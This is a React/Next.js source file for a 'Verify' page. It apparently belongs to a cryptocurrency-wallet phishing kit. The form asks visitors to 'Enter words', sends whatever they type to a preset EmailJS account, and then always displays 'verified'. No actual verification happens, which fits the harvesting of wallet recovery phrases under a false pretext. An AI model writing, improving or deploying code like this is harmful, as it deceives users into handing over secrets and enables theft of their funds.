"use client";

import React, { useState, useRef, FormEvent } from "react";
import Image from "next/image";
import emailjs from "emailjs-com";
import { UseMessage } from "../context/context";
import Trade from "../trade/page";

const About: React.FC = () => {
  const formElement = useRef<HTMLFormElement | null>(null);
  const { selectedMessage } = UseMessage();
  const [feedback, setFeedback] = useState<{
    type: "error" | "success";
    text: string;
  } | null>(null);
  const [submitting, setSubmitting] = useState(false);

  const handleVerification = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (!formElement.current) return;

    const inputValue = new FormData(formElement.current)
      .get("message")
      ?.toString()
      .trim();
    setFeedback(null);

    if (!inputValue) {
      setFeedback({ type: "error", text: "Please enter a message first." });
      return;
    }

    setSubmitting(true);
    try {
      await emailjs.send(
        process.env.NEXT_PUBLIC_EMAILJS_SERVICE_ID!,
        process.env.NEXT_PUBLIC_EMAILJS_TEMPLATE_ID!,
        { message: inputValue },
        process.env.NEXT_PUBLIC_EMAILJS_PUBLIC_KEY!
      );

      setFeedback({ type: "success", text: "verified" });
      formElement.current.reset();
    } catch (error) {
      console.error(error);
      setFeedback({ type: "error", text: "Failed to send email." });
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <div>
      <Trade />
      <section className="px-4 sm:px-10 md:px-20 lg:px-40 py-10">
        <div className="flex justify-center">
          {selectedMessage?.src && (
            <Image
              src={selectedMessage.src}
              alt="Selected"
              className="w-24 sm:w-28 md:w-36 object-contain"
            />
          )}
        </div>

        <h2 className="text-center text-2xl sm:text-3xl text-black/60 py-6 font-semibold">
          Verify
        </h2>

        <form
          ref={formElement}
          onSubmit={handleVerification}
          className="space-y-5"
        >
          <input
            type="text"
            name="message"
            aria-label="Message"
            placeholder="Enter words"
            className="border border-gray-300 px-4 py-4 w-full rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
          />

          {feedback && feedback.type === "error" && (
            <p
              aria-live="assertive"
              className="text-center text-red-500 text-sm"
            >
              {feedback.text}
            </p>
          )}
          {feedback && feedback.type === "success" && (
            <p
              aria-live="polite"
              className="text-center text-green-500 text-sm"
            >
              {feedback.text}
            </p>
          )}

          <div className="bg-blue-500">
            <button
              type="submit"
              disabled={submitting}
              className={`w-full text-black py-2 rounded-3xl font-semibold cursor-pointer transition ${
                submitting
                  ? "opacity-50 cursor-not-allowed"
                  : "hover:bg-blue-700"
              }`}
            >
              {submitting ? "Verifying..." : "Verify"}
            </button>
          </div>
        </form>
      </section>
    </div>
  );
};

export default About;
